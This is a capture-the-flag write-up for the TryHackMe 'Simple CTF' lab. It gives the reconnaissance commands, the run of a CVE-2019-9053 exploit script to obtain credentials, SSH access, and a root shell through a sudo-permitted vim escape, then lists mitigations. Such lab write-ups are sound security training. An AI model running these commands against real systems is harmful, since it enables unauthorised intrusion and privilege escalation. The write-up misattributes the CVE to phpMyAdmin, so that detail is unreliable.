[Simple CTF](https://tryhackme.com/room/easyctf)

**Difficulty:** Easy

**Objective:** Exploit CVE-2019-9053 to gain credentials, SSH into the server, and escalate privileges using a sudo-permitted VIM binary.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.172.58  
**Service/Ports:** 21/FTP, 80/HTTP, 2222/SSH  
**Entry Point:** phpMyAdmin CVE-2019-9053  
**Privilege Escalation:** Allowed sudo access to VIM as root  
**Outcome:** Retrieved root flag after spawning root shell via VIM

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance  
Initial scan:  
nmap -sV -sT 10.10.172.58  
Results:  
- 21/tcp - vsftpd 3.0.3  
- 80/tcp - Apache 2.4.18  
- 2222/tcp - OpenSSH 7.2p2 (custom port)

Also scanned all lower ports:  
nmap -p1-1000 10.10.172.58

---

## 4. Enumeration  
Used Gobuster:  
gobuster dir -u http://10.10.172.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
Found: /simple → /simple/admin/login.php

Researched this panel and identified CVE-2019-9053 (phpMyAdmin RCE / SQLi vulnerability)

---

## 5. Exploitation  
Downloaded exploit from: https://www.exploit-db.com/exploits/46635  
Fixed minor errors in the script  
Ran the exploit:  
python3 py.py -u http://10.10.172.58 --crack -w best110.txt  
Successfully extracted valid username and password  
Tried logging into web admin — nothing useful  
SSH'd into server using:  
ssh user@10.10.172.58 -p 2222  
Gained shell access

---

## 6. Privilege Escalation  
Enumerated users with:  
cat /etc/passwd  
Checked for SUID binaries:  
find / -perm -4000 2>/dev/null — no useful output  
Ran sudo -l and discovered:  
User mitch may run the following commands on Machine:  
(root) NOPASSWD: /usr/bin/vim

Used GTFOBins technique for vim:  
sudo vim -c ':!/bin/sh'  
This opened a root shell

---

## 7. Post Exploitation  
Navigated to `/root`  
Read final flag from root’s home directory

---

## 8. Flags / Proof  
Root Flag: Retrieved from /root/root.txt using VIM root shell

---

## 9. Mitigations  
| Vulnerability             | Risk   | Suggested Mitigation                                |  
|--------------------------|--------|-----------------------------------------------------|  
| Outdated phpMyAdmin      | High   | Update phpMyAdmin to latest secure version          |  
| SSH on high port         | Low    | Consider port knocking or 2FA, but not a vulnerability itself |  
| VIM as sudo root         | High   | Remove risky binary permissions, use role-based access control |

---

## 10. Notes  
Time spent: ~2 hours

Tools used: nmap, gobuster, exploit-db script, python3, SSH, GTFOBins

Lessons learned: Always validate remote admin panels and research associated CVEs. Custom SSH ports are still vulnerable if credentials are leaked. Misconfigured sudo permissions can easily lead to full system compromise.















